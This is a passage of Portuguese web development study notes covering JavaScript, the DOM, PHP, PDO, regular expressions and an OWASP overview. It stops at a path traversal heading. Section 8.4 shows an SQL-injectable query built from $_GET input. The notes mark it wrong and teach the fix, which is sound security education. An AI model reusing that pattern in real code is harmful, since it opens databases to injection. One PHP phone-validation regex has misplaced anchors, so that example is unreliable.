anos.sort((a, b) => a - b) // ordena numérico
anos.splice(1, 2, 1995)   // remove 2 e insere 1995 na posição 1

// Acessores (não mutam)
anos.concat([1994, 1995])   // une arrays
anos.slice(1, 3)            // copia parte
anos.indexOf(1991)          // índice ou -1
anos.includes(1991)         // boolean
anos.join(', ')             // string

// Iteradores de alta ordem
anos.forEach(a => console.log(a))
const pares = anos.filter(a => a % 2 === 0)
const dobros = anos.map(a => a * 2)
const soma = anos.reduce((acc, a) => acc + a, 0)
const primeiro = anos.find(a => a > 1990)
const idx = anos.findIndex(a => a > 1990)
anos.every(a => a > 1980)  // todos satisfazem?
anos.some(a => a > 1995)   // algum satisfaz?
```

---

### 4.6 Objetos

```javascript
// Literal
const pessoa = {
  nome: 'João',
  idade: 30,
  cumprimentar() {
    return `Olá, sou ${this.nome}`;
  }
};

// Acesso
pessoa.nome         // 'João'
pessoa['nome']      // 'João'
pessoa.morada       // undefined (sem erro)

// Desestruturação
const { nome, idade } = pessoa;
const { nome: n, idade: i } = pessoa; // renomear

// Spread de objetos
const copia = { ...pessoa, cidade: 'Porto' };

// Object.keys / values / entries
Object.keys(pessoa)    // ['nome', 'idade', 'cumprimentar']
Object.values(pessoa)  // ['João', 30, function]
Object.entries(pessoa) // [['nome', 'João'], ...]
```

---

### 4.7 Desestruturação

```javascript
// Arrays
const [a, b, ...resto] = [1, 2, 3, 4, 5];
// a=1, b=2, resto=[3,4,5]

// Swap
let x = 1, y = 2;
[x, y] = [y, x];

// Objetos
const { nome, ...outrosDetalhes } = pessoa;

// Em parâmetros de função
function mostrar({ nome, idade = 0 }) {
  console.log(`${nome}: ${idade}`);
}
mostrar({ nome: 'Ana', idade: 25 });
```

---

### 4.8 Map e Set

```javascript
// Map — chaves de qualquer tipo
const mapa = new Map();
mapa.set('nome', 'João');
mapa.set(42, 'resposta');
mapa.get('nome')  // 'João'
mapa.has(42)      // true
mapa.delete(42)
mapa.size         // 1

for (const [chave, valor] of mapa) {
  console.log(`${chave}: ${valor}`);
}

// Set — valores únicos
const conjunto = new Set([1, 2, 2, 3]);
conjunto.size   // 3
conjunto.add(4)
conjunto.has(2) // true
conjunto.delete(2)

for (const valor of conjunto) { ... }
```

---

### 4.9 Tratamento de Erros

```javascript
try {
  funcaoQueNaoExiste(); // lança ReferenceError
  console.log('não chega aqui');
} catch (e) {
  console.error(e.name);    // "ReferenceError"
  console.error(e.message); // "funcaoQueNaoExiste is not defined"
  throw new Error('relançar');
} finally {
  // executa sempre, mesmo que haja throw
  fecharLigacao();
}

// Tipos de erro
throw new Error('mensagem');
throw new TypeError('tipo errado');
throw new RangeError('fora do intervalo');

// Verificar tipo com instanceof
catch (e) {
  if (e instanceof TypeError) { ... }
}
```

---

### 4.10 Scope e Closures

```javascript
// Escopo léxico — variáveis são visíveis no seu bloco e descendentes
{
  const x = 10;
  console.log(x); // 10
}
console.log(x); // ReferenceError

// Closure — função "lembra" o seu contexto de criação
function contador() {
  let count = 0;
  return {
    incrementar() { count++; },
    obter() { return count; }
  };
}
const c = contador();
c.incrementar();
c.obter(); // 1

// Casos comuns com closures e loops
const paragrafos = document.querySelectorAll('p');
for (let i = 0; i < paragrafos.length; i++) {
  // let cria um novo binding por iteração
  paragrafos[i].addEventListener('click', () => {
    console.log('Parágrafo #' + i);
  });
}
```

---

## 5. JavaScript — DOM, Eventos e AJAX

### 5.1 DOM (Document Object Model)

O DOM é a representação em árvore do documento HTML, que o JavaScript pode manipular.

```javascript
// Selecionar elementos
document.getElementById('menu')
document.querySelector('.btn')           // primeiro match
document.querySelectorAll('p.intro')     // NodeList com todos

// Navegar na árvore
elemento.parentElement
elemento.children                    // HTMLCollection de filhos
elemento.firstElementChild
elemento.lastElementChild
elemento.nextElementSibling
elemento.previousElementSibling

// Criar e inserir elementos
const div = document.createElement('div');
div.textContent = 'Novo conteúdo';
div.innerHTML = '<strong>Negrito</strong>';
div.setAttribute('class', 'ativo');
div.classList.add('ativo');
div.classList.remove('inativo');
div.classList.toggle('ativo');
div.classList.contains('ativo');

pai.appendChild(filho);
pai.insertBefore(novo, referencia);
pai.removeChild(filho);
elemento.remove();

// Clonar
const clone = elemento.cloneNode(true); // true = clone profundo

// Atributos
elemento.getAttribute('href');
elemento.setAttribute('href', 'nova-url.php');
elemento.removeAttribute('disabled');

// CSS inline
elemento.style.color = 'red';
elemento.style.backgroundColor = '#fff';

// dataset (data-* attributes)
// <li data-id="42" data-tipo="produto">
lista.dataset.id;    // "42"
lista.dataset.tipo;  // "produto"
```

---

### 5.2 Eventos

```javascript
// Adicionar evento
elemento.addEventListener('click', handler);
elemento.addEventListener('click', handler, { once: true }); // dispara só uma vez

// Remover evento
elemento.removeEventListener('click', handler);

// Tipos de eventos comuns
'click', 'dblclick', 'mouseenter', 'mouseleave', 'mouseover', 'mouseout'
'keydown', 'keyup', 'keypress'
'submit', 'change', 'input', 'focus', 'blur'
'load', 'DOMContentLoaded', 'resize', 'scroll'
'touchstart', 'touchend', 'touchmove'

// Objeto de evento
elemento.addEventListener('click', function(event) {
  event.preventDefault();          // previne comportamento padrão (ex: link)
  event.stopPropagation();         // para a propagação (bubbling)
  event.target;                    // elemento que disparou o evento
  event.currentTarget;             // elemento onde o listener está registado
  event.type;                      // 'click'
});
```

**Event Bubbling e Capturing:**
```javascript
// Bubbling (padrão): inner → outer
// Capturing: outer → inner
elemento.addEventListener('click', handler, true);  // capturing
elemento.addEventListener('click', handler, false); // bubbling (padrão)

// Delegação de eventos (event delegation)
// Registar um listener no pai em vez de cada filho
document.querySelector('ul').addEventListener('click', function(e) {
  if (e.target.matches('li')) {
    console.log('Clicou em:', e.target.textContent);
  }
});
```

---

### 5.3 Timers

```javascript
// Executar uma vez após delay (ms)
const id = setTimeout(() => {
  console.log('5 segundos depois!');
}, 5000);

clearTimeout(id); // cancelar

// Executar repetidamente
const idInterval = setInterval(() => {
  console.log('1 segundo!');
}, 1000);

clearInterval(idInterval); // parar
```

---

### 5.4 Código Assíncrono

**Callbacks:**
```javascript
function obterDados(callback) {
  setTimeout(() => callback('dados'), 1000);
}
obterDados(dados => console.log(dados));
```

**Promises:**
```javascript
const promessa = new Promise((resolve, reject) => {
  const ok = true;
  if (ok) resolve('sucesso');
  else reject(new Error('falhou'));
});

promessa
  .then(resultado => console.log(resultado))
  .catch(erro => console.error(erro))
  .finally(() => console.log('sempre executa'));

// Encadeamento
fetch('/api/dados')
  .then(resposta => resposta.json())
  .then(json => console.log(json))
  .catch(err => console.error(err));

// Promise.all — espera todas
Promise.all([p1, p2, p3]).then(([r1, r2, r3]) => { ... });

// Promise.race — resolve com a primeira
Promise.race([p1, p2]).then(resultado => { ... });
```

**async/await (syntactic sugar sobre Promises):**
```javascript
async function obterUtilizador(id) {
  try {
    const resposta = await fetch(`/api/users/${id}`);
    if (!resposta.ok) throw new Error(`HTTP ${resposta.status}`);
    const dados = await resposta.json();
    return dados;
  } catch (erro) {
    console.error('Erro:', erro);
    throw erro;
  }
}

// Uso
const utilizador = await obterUtilizador(1);
// ou
obterUtilizador(1).then(u => console.log(u));
```

---

### 5.5 AJAX — XMLHttpRequest (legado)

```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', '/api/dados', true); // true = assíncrono

xhr.addEventListener('load', function() {
  if (this.status === 200) {
    const dados = JSON.parse(this.responseText);
    console.log(dados);
  }
});

xhr.addEventListener('error', function() {
  console.error('Erro de rede');
});

xhr.send(); // para POST: xhr.send(dados);
```

---

### 5.6 Fetch API (moderno)

```javascript
// GET simples
const resposta = await fetch('/api/dados');
const json = await resposta.json();

// Verificar resposta
if (!resposta.ok) {
  throw new Error(`Erro: ${resposta.status}`);
}

// POST com JSON
const resposta = await fetch('/api/guardar', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ nome: 'João', idade: 30 })
});

// POST com form data
const formData = new FormData();
formData.append('nome', 'João');
const resposta = await fetch('/api/guardar', {
  method: 'POST',
  body: formData  // Content-Type é definido automaticamente
});

// Resposta
resposta.ok          // boolean (status 200-299)
resposta.status      // número (200, 404, ...)
resposta.statusText  // 'OK', 'Not Found', ...
resposta.url         // URL final (após redirects)
await resposta.json()     // parse JSON
await resposta.text()     // texto
await resposta.blob()     // binário
await resposta.formData() // FormData
```

---

### 5.7 JSON

```javascript
// Serializar para JSON
JSON.stringify({ nome: 'João', idade: 30 });
// '{"nome":"João","idade":30}'

JSON.stringify(obj, null, 2); // formatado com 2 espaços de indentação

// Parsear JSON
const obj = JSON.parse('{"nome":"João"}');
obj.nome; // 'João'

// Tipos válidos em JSON: string, number, boolean, null, array, object
// NÃO suporta: undefined, Date, Function, Symbol
```

---

### 5.8 Web Storage

```javascript
// localStorage — persiste entre sessões
localStorage.setItem('cor', 'azul');
const cor = localStorage.getItem('cor'); // 'azul'
localStorage.removeItem('cor');
localStorage.clear();

// sessionStorage — limpo ao fechar o separador
sessionStorage.setItem('token', 'abc123');

// Guardar objetos
localStorage.setItem('user', JSON.stringify({ id: 1, nome: 'João' }));
const user = JSON.parse(localStorage.getItem('user'));
```

---

## 6. JavaScript — OOP, Módulos e Async

### 6.1 Protótipos

```javascript
// Cada objeto tem um [[Prototype]] (cadeia de protótipos)
const arr = [1, 2, 3];
// arr.__proto__ === Array.prototype
// Array.prototype.__proto__ === Object.prototype
// Object.prototype.__proto__ === null

// Constructor function (forma antiga)
function Pessoa(nome) {
  this.nome = nome;
}
Pessoa.prototype.cumprimentar = function() {
  return `Olá, sou ${this.nome}`;
};

const joao = new Pessoa('João');
joao.cumprimentar(); // "Olá, sou João"
joao instanceof Pessoa; // true
```

---

### 6.2 Classes ES6

```javascript
class Pessoa {
  // Campo público
  nome;
  // Campo privado (# prefix)
  #idade;
  // Campo estático
  static populacao = 0;

  constructor(nome, idade) {
    this.nome = nome;
    this.#idade = idade;
    Pessoa.populacao++;
  }

  // Método
  cumprimentar() {
    return `Olá, sou ${this.nome}`;
  }

  // Getter
  get idade() { return this.#idade; }

  // Setter
  set idade(val) {
    if (val >= 0) this.#idade = val;
  }

  // Método estático
  static comparar(p1, p2) {
    return p1.nome === p2.nome;
  }

  toString() {
    return `Pessoa(${this.nome})`;
  }
}

// Herança
class Trabalhador extends Pessoa {
  constructor(nome, idade, profissao) {
    super(nome, idade); // obrigatório antes de usar this
    this.profissao = profissao;
  }

  // Override
  cumprimentar() {
    return `${super.cumprimentar()} e sou ${this.profissao}`;
  }
}

const j = new Trabalhador('João', 30, 'Programador');
j instanceof Pessoa;      // true
j instanceof Trabalhador; // true
```

> 💡 Classes JS são **syntactic sugar** sobre protótipos — internamente usam `prototype`.

---

### 6.3 `this`

```javascript
// Em métodos de objetos — o objeto que chama o método
const obj = {
  nome: 'Objeto',
  mostrar() { console.log(this.nome); }
};
obj.mostrar(); // 'Objeto'

// Em funções regulares (modo não-estrito) — window/global
function f() { console.log(this); } // window

// Arrow functions — herdam this do contexto envolvente
const obj2 = {
  nome: 'Obj2',
  metodo() {
    const inner = () => console.log(this.nome); // usa this do metodo
    inner();
  }
};
obj2.metodo(); // 'Obj2'

// bind, call, apply — definir this explicitamente
function cumprimentar(saudacao) {
  return `${saudacao}, ${this.nome}!`;
}
const joao = { nome: 'João' };

cumprimentar.call(joao, 'Olá');    // chama imediatamente
cumprimentar.apply(joao, ['Olá']); // chama com array de args
const olaNome = cumprimentar.bind(joao, 'Olá'); // cria nova função
olaNome(); // "Olá, João!"

// Perder 'this' em event listeners
class MeuComponente {
  setup() {
    // ❌ this será o elemento clicado
    document.querySelector('button').addEventListener('click', this.click);
    // ✅ usar bind
    document.querySelector('button').addEventListener('click', this.click.bind(this));
    // ✅ ou arrow function
    document.querySelector('button').addEventListener('click', () => this.click());
  }
  click() { /* this é MeuComponente */ }
}
```

---

### 6.4 Módulos ES6

```javascript
// exportar.js
export const PI = 3.14159;
export function somar(a, b) { return a + b; }
export default class Calculadora { ... }

// importar.js
import Calculadora from './exportar.js';     // default import
import { PI, somar } from './exportar.js';   // named imports
import { PI as pi } from './exportar.js';    // com alias
import * as tudo from './exportar.js';       // tudo como namespace

// Em HTML
<script type="module" src="app.js"></script>
```

---

## 7. PHP — Fundamentos

### 7.1 Introdução

- **P**HP: **H**ypertext **P**reprocessor (acrónimo recursivo)
- Criado por Rasmus Lerdorf em **1994**
- Linguagem **dinamicamente tipada**, do lado do **servidor**
- O servidor interpreta o PHP e devolve HTML ao browser

**Como funciona:**
1. Browser pede recurso PHP ao servidor
2. Servidor executa o script PHP
3. Servidor devolve HTML ao browser

---

### 7.2 Sintaxe Básica

```php
<?php
// Delimitadores PHP
echo 'Olá, Mundo!';   // output
echo "Olá, $nome!";   // interpolação em aspas duplas
?>

<!-- Fora dos delimitadores é HTML puro -->
<p><?= $variavel ?></p>  <!-- shorthand echo -->

<?php
// Comentários
// linha única
# também linha única
/* multi
   linha */
?>
```

---

### 7.3 Variáveis e Tipos

```php
$nome = 'João';      // string
$idade = 25;         // int
$altura = 1.75;      // float
$ativo = true;       // bool (case-insensitive: True, TRUE)
$nada = null;        // null

// Verificar tipo
gettype($nome)    // "string"
is_string($nome) // true
is_int($idade)   // true
var_dump($idade); // int(25)
print_r($arr);    // estrutura legível (sem tipos)

// Verificar existência e valor
isset($var)   // true se declarada e não null
empty($var)   // true se falsy (0, "", null, false, [], "0")
is_null($var) // true apenas se null

// Null coalesce
$val = $a ?? $default;       // $a se não null, senão $default
$val ??= $default;           // atribuir $default se $a for null

// Remover variável
unset($var);
```

**Type Juggling (conversão automática):**
```php
echo 5 + '10 batatas'; // 15 (string convertida para int)
echo '5' == 5;         // true (conversão)
echo '5' === 5;        // false (sem conversão — tipo diferente)
echo 0 == 'abc';       // true (atenção!) em PHP < 8
// Em PHP 8: 0 == 'abc' é false
```

---

### 7.4 Strings

```php
// Aspas simples — sem interpolação (mais rápido)
$a = 'Olá $nome';  // literal "$nome"

// Aspas duplas — com interpolação
$b = "Olá $nome";
$c = "Olá {$obj->nome}";

// Heredoc
$texto = <<<EOT
Linha 1 com $variavel
Linha 2
EOT;

// Funções de string
strlen($str)              // comprimento
strtolower($str)          // minúsculas
strtoupper($str)          // maiúsculas
trim($str)                // remover espaços/newlines
ltrim() / rtrim()
str_replace('old', 'new', $str)
strpos($str, 'procurar')  // posição ou false
substr($str, 0, 5)        // substring
explode(',', $str)        // separar em array
implode(', ', $arr)       // juntar array
sprintf("Nome: %s, Idade: %d", $nome, $idade) // formatação
str_contains($str, 'sub') // PHP 8+
htmlspecialchars($str)    // escapar HTML (para segurança)
htmlentities($str)        // escapar todas as entidades HTML
```

---

### 7.5 Arrays

```php
// Arrays indexados
$frutas = ['maçã', 'banana', 'pera'];
$frutas[] = 'uva';             // adicionar
$frutas[0]                     // 'maçã'
count($frutas)                 // 4

// Arrays associativos
$pessoa = ['nome' => 'João', 'idade' => 30];
$pessoa['nome']                // 'João'

// Arrays multidimensionais
$tabela = [
  ['nome' => 'A', 'nota' => 18],
  ['nome' => 'B', 'nota' => 15],
];

// Funções de array
array_push($arr, $elem)        // adicionar no fim
array_pop($arr)                // remover do fim
array_shift($arr)              // remover do início
array_unshift($arr, $elem)     // adicionar no início
array_merge($arr1, $arr2)      // juntar
array_slice($arr, 1, 3)        // parte do array
array_keys($arr)               // chaves
array_values($arr)             // valores
in_array('banana', $arr)       // existe?
array_search('banana', $arr)   // chave onde existe
sort($arr)                     // ordenar valores
ksort($arr)                    // ordenar por chaves
usort($arr, function($a, $b) { return $a - $b; }) // ordenar com comparador
array_map(function($x) { return $x * 2; }, $arr)
array_filter($arr, function($x) { return $x > 0; })
array_reduce($arr, function($acc, $x) { return $acc + $x; }, 0)

// Iteração
foreach ($arr as $valor) { ... }
foreach ($arr as $chave => $valor) { ... }
```

---

### 7.6 Controlo de Fluxo PHP

```php
// Idêntico a outras linguagens com pequenas diferenças
if ($expr) { ... } elseif (...) { ... } else { ... }
while ($expr) { ... }
for ($i = 0; $i < 10; $i++) { ... }
foreach ($arr as $v) { ... }

// switch — usa comparação solta (==)
switch ($val) {
  case 1: ...; break;
  default: ...;
}

// match — usa comparação estrita (===), PHP 8+
$resultado = match($status) {
  200     => 'OK',
  404     => 'Not Found',
  default => 'Desconhecido'
};

// Parar execução
die('Mensagem de erro');
exit(0);  // código de saída

// Sintaxe alternativa (útil em templates)
if ($condicao): ?>
  <p>HTML aqui</p>
<?php endif; ?>

<?php foreach ($arr as $v): ?>
  <li><?= $v ?></li>
<?php endforeach; ?>
```

---

### 7.7 Funções PHP

```php
function somar(int $a, int $b): int {
  return $a + $b;
}

// Com tipo de retorno nullable
function obterNome(): ?string {
  return null; // ou string
}

// Parâmetros com valor padrão
function criar($nome, $ativo = true) { ... }

// Referências
function incrementar(&$valor) {
  $valor++;
}
$x = 5;
incrementar($x);
echo $x; // 6

// Funções anónimas (closures)
$dobrar = function($n) { return $n * 2; };
$dobrar(5); // 10

// Com use para capturar variáveis externas
$fator = 3;
$multiplicar = function($n) use ($fator) {
  return $n * $fator;
};

// Arrow functions (PHP 7.4+)
$quadrado = fn($n) => $n ** 2;
```

---

### 7.8 Superglobais

```php
// Parâmetros GET (URL)
$_GET['nome']         // ?nome=João
$_GET['pagina'] ?? 1  // com valor padrão

// Parâmetros POST (corpo do pedido)
$_POST['password']

// Todos os parâmetros (GET + POST + cookies)
$_REQUEST['campo']

// Sessão (ver abaixo)
$_SESSION['utilizador_id']

// Cookies
$_COOKIE['preferencia']

// Ficheiros enviados
$_FILES['foto']['name']
$_FILES['foto']['type']
$_FILES['foto']['tmp_name']
$_FILES['foto']['size']
$_FILES['foto']['error']

// Informação do servidor
$_SERVER['REQUEST_METHOD']   // GET, POST, PUT, ...
$_SERVER['HTTP_HOST']        // www.exemplo.com
$_SERVER['HTTP_ACCEPT']      // application/json
$_SERVER['HTTP_ORIGIN']      // para CORS
$_SERVER['DOCUMENT_ROOT']
$_SERVER['PHP_SELF']         // caminho do script atual
$_SERVER['QUERY_STRING']     // tudo após '?'
$_SERVER['REMOTE_ADDR']      // IP do cliente
```

---

### 7.9 Sessões

```php
// Iniciar sessão (antes de qualquer output)
session_start();

// Configurar cookie de sessão (antes de session_start)
session_set_cookie_params([
  'lifetime' => 0,       // até fechar o browser
  'path'     => '/',
  'secure'   => true,    // apenas HTTPS
  'httponly' => true,    // inacessível a JS
  'samesite' => 'Strict'
]);

// Usar sessão
$_SESSION['utilizador_id'] = 42;
$_SESSION['username'] = 'joao';

// Verificar
if (isset($_SESSION['utilizador_id'])) {
  echo 'Autenticado como: ' . $_SESSION['username'];
}

// Destruir sessão (logout)
session_start();
session_unset();    // limpar variáveis
session_destroy();  // destruir sessão no servidor
// Invalidar cookie do lado do cliente:
setcookie(session_name(), '', time() - 3600, '/');
```

---

### 7.10 Cookies

```php
// Criar cookie
setcookie(
  'preferencia',    // nome
  'escuro',         // valor
  time() + 86400,   // expiração (1 dia)
  '/',              // path
  '',               // domínio
  true,             // secure
  true              // httponly
);

// Ler cookie
$_COOKIE['preferencia'] // 'escuro'

// Apagar cookie
setcookie('preferencia', '', time() - 1, '/');
```

---

### 7.11 Includes

```php
include('arquivo.php');          // aviso se não encontrar
require('arquivo.php');          // erro fatal se não encontrar
include_once('arquivo.php');     // inclui apenas uma vez
require_once('arquivo.php');     // require + once

// Caminhos relativos ao ficheiro atual (recomendado)
require_once(__DIR__ . '/config/database.php');
// equivalente
require_once(dirname(__FILE__) . '/config/database.php');
```

---

### 7.12 JSON em PHP

```php
// PHP → JSON
$dados = ['nome' => 'João', 'notas' => [18, 15, 20]];
$json = json_encode($dados);
// '{"nome":"João","notas":[18,15,20]}'

// JSON formatado
json_encode($dados, JSON_PRETTY_PRINT);

// JSON → PHP
$obj = json_decode($json);           // objeto stdClass
$arr = json_decode($json, true);     // array associativo

// Enviar JSON
header('Content-Type: application/json; charset=utf-8');
echo json_encode($dados);
```

---

## 8. PHP — OOP, PDO e Boas Práticas

### 8.1 Classes em PHP

```php
<?php
class Carro {
  // Propriedades
  public string $marca;
  protected int $ano;
  private float $preco;
  public static int $total = 0;

  // Construtor
  public function __construct(string $marca, int $ano, float $preco) {
    $this->marca = $marca;
    $this->ano   = $ano;
    $this->preco = $preco;
    self::$total++;
  }

  // Getter/Setter
  public function getPreco(): float { return $this->preco; }
  public function setPreco(float $p): void { 
    if ($p >= 0) $this->preco = $p; 
  }

  // Método público
  public function descrever(): string {
    return "{$this->marca} ({$this->ano})";
  }

  // Método estático
  public static function getTotalCarros(): int {
    return self::$total;
  }

  // Magic methods
  public function __toString(): string {
    return $this->descrever();
  }
}

$c = new Carro('Toyota', 2023, 25000.00);
echo $c->descrever();
echo Carro::getTotalCarros();
```

---

### 8.2 Herança, Interfaces e Traits

```php
// Herança
class CarroElectrico extends Carro {
  private int $autonomia;

  public function __construct(string $marca, int $ano, float $preco, int $autonomia) {
    parent::__construct($marca, $ano, $preco); // chamar construtor pai
    $this->autonomia = $autonomia;
  }

  // Override
  public function descrever(): string {
    return parent::descrever() . " (Elétrico, {$this->autonomia}km)";
  }
}

// Interface — contrato que a classe deve cumprir
interface Conduzivel {
  public function arrancar(): void;
  public function parar(): void;
}

class Mota implements Conduzivel {
  public function arrancar(): void { echo 'Vrum!'; }
  public function parar(): void { echo 'Squeak!'; }
}

// Classe abstrata — não pode ser instanciada
abstract class Veiculo {
  abstract public function tipoMotor(): string;
  
  public function descrever(): string {
    return "Veículo com motor: " . $this->tipoMotor();
  }
}

// Trait — reutilização de código sem herança
trait Registavel {
  private static array $log = [];
  
  public static function registarAcao(string $acao): void {
    self::$log[] = $acao;
  }
  
  public static function getLog(): array {
    return self::$log;
  }
}

class Utilizador {
  use Registavel;
}

Utilizador::registarAcao('login');
```

---

### 8.3 PDO — PHP Data Objects

```php
<?php
// Conexão
try {
  $dsn = 'sqlite:base_dados.db';
  // Para MySQL: 'mysql:host=localhost;dbname=mydb;charset=utf8'
  $dbh = new PDO($dsn);
  $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
  $dbh->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
} catch (PDOException $e) {
  die('Erro na conexão: ' . $e->getMessage());
}

// SELECT com prepared statements (SEMPRE usar para evitar SQL Injection)
$stmt = $dbh->prepare('SELECT * FROM utilizadores WHERE username = ?');
$stmt->execute([$username]);
$user = $stmt->fetch();     // um registo
$users = $stmt->fetchAll(); // todos os registos

// Parâmetros nomeados
$stmt = $dbh->prepare('SELECT * FROM items WHERE owner = :owner AND ativo = :ativo');
$stmt->execute([':owner' => $userId, ':ativo' => 1]);

// INSERT
$stmt = $dbh->prepare('INSERT INTO utilizadores (username, password) VALUES (?, ?)');
$stmt->execute([$username, password_hash($password, PASSWORD_DEFAULT)]);
$id = $dbh->lastInsertId(); // id do registo inserido

// UPDATE
$stmt = $dbh->prepare('UPDATE utilizadores SET nome = ? WHERE id = ?');
$stmt->execute([$nome, $id]);
echo $stmt->rowCount(); // linhas afetadas

// DELETE
$stmt = $dbh->prepare('DELETE FROM utilizadores WHERE id = ?');
$stmt->execute([$id]);

// Transações
$dbh->beginTransaction();
try {
  $stmt1->execute([...]);
  $stmt2->execute([...]);
  $dbh->commit();
} catch (Exception $e) {
  $dbh->rollBack();
  throw $e;
}
```

---

### 8.4 Boas Práticas PHP

```php
// 1. NUNCA concatenar input do utilizador em SQL!
// ❌ ERRADO — vulnerável a SQL Injection
$dbh->query("SELECT * FROM users WHERE name = '" . $_GET['name'] . "'");

// ✅ CORRETO — prepared statement
$stmt = $dbh->prepare('SELECT * FROM users WHERE name = ?');
$stmt->execute([$_GET['name']]);

// 2. Separar lógica de apresentação
<?php
  // Lógica primeiro
  $stmt = $dbh->prepare('SELECT * FROM carros');
  $stmt->execute();
  $carros = $stmt->fetchAll();
?>
<!-- Depois o HTML -->
<?php foreach ($carros as $carro): ?>
  <li><?= htmlspecialchars($carro['marca']) ?></li>
<?php endforeach; ?>

// 3. DRY — não repetir código
// Em database/carros.php
function getAllCarros(PDO $dbh): array {
  $stmt = $dbh->prepare('SELECT * FROM carros');
  $stmt->execute();
  return $stmt->fetchAll();
}

// 4. Separar ações de vistas
// list_cars.php — mostra lista
// view_car.php  — mostra um carro (recebe id por GET)
// edit_car.php  — formulário de edição
// save_car.php  — processa e redireciona (POST only)

// 5. Validar SEMPRE o input
if (empty($_POST['nome']) || strlen($_POST['nome']) > 100) {
  http_response_code(400);
  die('Nome inválido');
}
```

---

## 9. Expressões Regulares

### 9.1 Conceitos Básicos

Uma **expressão regular (regex)** é um padrão de pesquisa em strings.

Usada em: validação de dados, pesquisa/substituição, parsing.

---

### 9.2 Caracteres e Classes

```regex
a       literal 'a'
ab      literal 'ab' em sequência
.       qualquer caractere exceto newline

[abc]   a, b ou c (classe de caracteres)
[a-z]   a até z (intervalo)
[A-Za-z0-9] letras e dígitos
[^abc]  negação: tudo exceto a, b, c
[^A-Z]  tudo exceto maiúsculas

\d      dígito: [0-9]
\D      não-dígito: [^0-9]
\w      palavra: [A-Za-z0-9_]
\W      não-palavra
\s      whitespace: [ \t\r\n\f]
\S      não-whitespace

\t      tab
\n      newline
\r      carriage return
```

---

### 9.3 Âncoras e Limites

```regex
^       início da string (ou linha em modo multiline)
$       fim da string (ou linha em modo multiline)
\b      limite de palavra (word boundary)
\B      não limite de palavra

^olá$   string é exatamente 'olá'
\bword\b   'word' como palavra isolada
```

---

### 9.4 Quantificadores

```regex
?       0 ou 1 vez (opcional)
*       0 ou mais vezes
+       1 ou mais vezes
{n}     exatamente n vezes
{n,m}   entre n e m vezes
{n,}    pelo menos n vezes
{,m}    no máximo m vezes

# Por padrão são greedy (consomem o máximo)
<.+>    corresponde a '<strong>texto</strong>' inteiro

# Adicionar ? torna lazy (consome o mínimo)
<.+?>   corresponde a '<strong>' e depois '</strong>'

# Alternativa: classe negada (mais eficiente)
<[^>]+>  corresponde a '<strong>' e depois '</strong>'
```

---

### 9.5 Alternação e Agrupamento

```regex
gato|cão       'gato' ou 'cão'

(gato|cão)     grupo de captura (numerado automaticamente)
(?:gato|cão)   grupo sem captura

((\d{4})-(\d{2})-(\d{2}))
# Grupo 0: todo o match
# Grupo 1: data completa (ex: 2024-01-15)
# Grupo 2: ano (2024)
# Grupo 3: mês (01)
# Grupo 4: dia (15)

\1   backreference ao grupo 1 (repetir o mesmo texto)
# Exemplo: ([a-z])\1 — letra duplicada (aa, bb, cc...)
```

---

### 9.6 Lookaround

```regex
(?=...)   lookahead positivo — seguido de
(?!...)   lookahead negativo — não seguido de
(?<=...)  lookbehind positivo — precedido de
(?<!...)  lookbehind negativo — não precedido de

(gato|cão)(?=s)    'gato' ou 'cão' seguido de 's'
\d+(?= euros)      número seguido de ' euros' (sem capturar ' euros')
(?<=€)\d+          número precedido de '€'
```

---

### 9.7 Modificadores

| Modificador | PHP | JS | Efeito |
|------------|-----|-----|--------|
| `i` | `/pat/i` | `/pat/i` | Case-insensitive |
| `g` | — | `/pat/g` | Global (todas as ocorrências) |
| `m` | `/pat/m` | `/pat/m` | Multiline (`^` e `$` por linha) |
| `s` | `/pat/s` | `/pat/s` | Dotall (`.` inclui newlines) |

---

### 9.8 Regex em PHP

```php
// Padrões delimitados por /, # ou ~
// Modificadores após o delimitador final

// preg_match — testar se padrão existe (devolve 0 ou 1)
preg_match('/^\d{9}$/', $telefone)  // valida 9 dígitos exatos
preg_match('/(\d{4})-(\d{3})/', $cp, $matches);
// $matches[0] = '4100-122', $matches[1] = '4100', $matches[2] = '122'

// preg_match_all — todas as ocorrências
preg_match_all('/\d+/', 'a1 b22 c333', $matches);
// $matches[0] = ['1', '22', '333']

// preg_replace — substituir
$resultado = preg_replace('/\s+/', ' ', $texto);  // colapsar espaços
$resultado = preg_replace('/(gato|cão)/', 'animal', $texto);
$resultado = preg_replace('/(\w+)/', '<b>$1</b>', $texto); // com captura

// Validação com âncoras (IMPORTANTE!)
function validarEmail($email) {
  return preg_match('/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/', $email);
}

function validarTelefone($tel) {
  return preg_match('/^\d{9}|\d{3}-\d{3}-\d{3}$/', $tel);
}
```

---

### 9.9 Regex em JavaScript

```javascript
// Literais de regex
const padrao = /^\d{9}$/;
const padraoGlobal = /\d+/g;

// Métodos do objeto RegExp
padrao.test('123456789')     // true/false
padrao.exec('texto 123')     // array com match ou null

// Métodos de String
'texto'.match(/\d+/)         // primeiro match com grupos
'texto'.match(/\d+/g)        // array com todos os matches (global)
'texto'.search(/\d+/)        // índice do primeiro match ou -1
'a1b2'.replace(/\d/, 'X')   // 'aXb2' (só o primeiro)
'a1b2'.replace(/\d/g, 'X')  // 'aXbX' (todos)
'a1b2'.replace(/(\d)/, '$1$1') // backreference: 'a11b2'
'a,b,,c'.split(/,+/)         // ['a', 'b', 'c']

// Validação
function validarTelefone(tel) {
  return /^\d{9}$/.test(tel);
}

// Em HTML — atributo pattern (sem delimitadores, sem âncoras implícitas)
<input type="text" pattern="\d{9}">
```

---

## 10. Segurança Web

### 10.1 Conceitos Fundamentais

- **Vulnerabilidade** — falha na aplicação que pode ser explorada
- **Ataque** — técnica para explorar uma vulnerabilidade
- **OWASP** (Open Web Application Security Project) — lista os 10 riscos mais críticos

**OWASP Top 10 (2021):**
1. Broken Access Control (inclui CSRF)
2. Cryptographic Failures (inclui falta de HTTPS)
3. **Injection** (inclui SQL Injection e XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures (gestão de passwords)
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

---

### 10.2 Path Traversal

